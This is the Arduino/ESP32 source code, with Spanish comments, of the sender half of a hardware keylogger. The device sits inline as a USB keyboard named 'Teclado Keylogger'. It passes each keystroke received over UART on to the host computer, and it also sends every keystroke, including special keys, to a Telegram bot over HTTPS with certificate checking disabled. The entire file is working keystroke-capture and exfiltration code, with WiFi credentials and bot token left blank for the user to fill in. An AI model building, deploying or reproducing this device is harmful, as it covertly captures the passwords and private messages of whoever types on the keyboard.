// Codigo emisor keylogger - solo envio a Telegram
#include "USB.h"
#include "USBHIDKeyboard.h"
#include <WiFi.h>
#include <HTTPClient.h>
#include <WiFiClientSecure.h>
#include "freertos/queue.h"

// ====== Objetos principales ======
USBHIDKeyboard Keyboard;

// ====== Configuracion UART ======
#define RX_PIN 18
#define TX_PIN 17
#define BAUD_RATE 9600

// ====== Configuracion WiFi ======
const char* ssid     = ""; // Nombre del WiFi
const char* password = ""; // Clave del WiFi

// ====== Configuracion de Telegram ======
String botToken = ""; // Token del bot de telegram
String chatID   = ""; // ID del chat

// ====== Comandos especiales ======
#define CMD_ESC        0x1B
#define CMD_TAB        0x09
#define CMD_CAPS       0x14
#define CMD_BACKSPACE  0x08
#define CMD_ENTER      0x0A
#define CMD_GUI        0x90
#define CMD_ALTGR      0x92

// ====== Tabla de equivalencias ======
typedef struct {
  uint8_t command;
  uint8_t keycode;
} CommandMap;

CommandMap commandMap[] = {
  {CMD_ESC,       KEY_ESC},
  {CMD_TAB,       KEY_TAB},
  {CMD_CAPS,      KEY_CAPS_LOCK},
  {CMD_BACKSPACE, KEY_BACKSPACE},
  {CMD_ENTER,     KEY_RETURN}
};

const uint8_t commandCount = sizeof(commandMap) / sizeof(CommandMap);

// ====== Cola para envio de teclas ======
#define KEYBUF_LEN 128
#define QUEUE_SIZE 32
QueueHandle_t keyQueue;

// =====================================================================
// ============ URL ENCODE =============================================
// =====================================================================

String urlEncode(const char* input) {
  String out = "";
  for (size_t i = 0; input[i] != '\0'; ++i) {
    uint8_t c = (uint8_t)input[i];
    if (isalnum(c)) {
      out += (char)c;
    } else {
      char tmp[4];
      sprintf(tmp, "%%%02X", c);
      out += tmp;
    }
  }
  return out;
}

// =====================================================================
// ============ Envio asincrono (cola) =================================
// =====================================================================

void sendLater(const String& key) {
  char buf[KEYBUF_LEN];
  key.toCharArray(buf, KEYBUF_LEN);
  xQueueSend(keyQueue, buf, 0);
}

// =====================================================================
// ============ TAREA DE ENVIO A TELEGRAM ==============================
// =====================================================================

void serverTask(void* parameter) {
  char keyBuf[KEYBUF_LEN];

  WiFiClientSecure client;
  client.setInsecure();

  HTTPClient http;

  for (;;) {
    if (xQueueReceive(keyQueue, &keyBuf, portMAX_DELAY) == pdTRUE) {
      if (WiFi.status() == WL_CONNECTED) {

        String encoded = urlEncode(keyBuf);

        String url = "https://api.telegram.org/bot" + botToken +
                     "/sendMessage?chat_id=" + chatID +
                     "&text=" + encoded;

        http.setTimeout(2000);

        if (http.begin(client, url)) {
          http.GET();
          http.end();
        }
      }
    }
  }
}

// =====================================================================
// ========================== CONTROL HID ===============================
// =====================================================================

void pressAndRelease(uint8_t key) {
  Keyboard.press(key);
  Keyboard.release(key);
}

bool isSpecialCommand(uint8_t cmd) {
  if (cmd == CMD_GUI || cmd == CMD_ALTGR) return true;

  for (int i = 0; i < commandCount; i++) {
    if (cmd == commandMap[i].command) return true;
  }
  return false;
}

void handleSpecialCommand(uint8_t cmd) {
  for (int i = 0; i < commandCount; i++) {
    if (cmd == commandMap[i].command) {
      pressAndRelease(commandMap[i].keycode);

      switch (cmd) {
        case CMD_ESC: sendLater("ESC"); break;
        case CMD_TAB: sendLater("TAB"); break;
        case CMD_CAPS: sendLater("CAPS_LOCK"); break;
        case CMD_BACKSPACE: sendLater("BACKSPACE"); break;
        case CMD_ENTER: sendLater("ENTER"); break;
        default: sendLater(String(commandMap[i].keycode)); break;
      }
      return;
    }
  }

  if (cmd == CMD_GUI) {
    pressAndRelease(KEY_LEFT_GUI);
    sendLater("GUI");
  }

  if (cmd == CMD_ALTGR) {
    pressAndRelease(KEY_RIGHT_ALT);
    sendLater("ALTGR");
  }
}

// =====================================================================
// ============================ SETUP ==================================
// =====================================================================

void setup() {
  Serial.begin(115200);
  Serial1.begin(BAUD_RATE, SERIAL_8N1, RX_PIN, TX_PIN);

  USB.productName("Teclado Keylogger");
  USB.begin();

  Keyboard.begin();
  delay(500);

  WiFi.begin(ssid, password);
  int retries = 0;
  while (WiFi.status() != WL_CONNECTED && retries < 20) {
    delay(500);
    retries++;
  }

  keyQueue = xQueueCreate(QUEUE_SIZE, KEYBUF_LEN);
  if (keyQueue != NULL) {
    xTaskCreatePinnedToCore(serverTask, "ServerTask", 4096, NULL, 1, NULL, 1);
  }
}

// =====================================================================
// ============================= LOOP ==================================
// =====================================================================

void loop() {
  if (Serial1.available()) {
    uint8_t c = Serial1.read();

    if (isSpecialCommand(c)) {
      handleSpecialCommand(c);
    }

    else if (c >= 0x20 && c <= 0x7E) {

      if (c == '@') {
        Keyboard.press(KEY_RIGHT_ALT);
        Keyboard.press('q');
        Keyboard.release('q');
        Keyboard.release(KEY_RIGHT_ALT);
        sendLater("@");
      } else {
        Keyboard.write((char)c);
        sendLater(String((char)c));
      }
    }
  }

  delay(1);
}
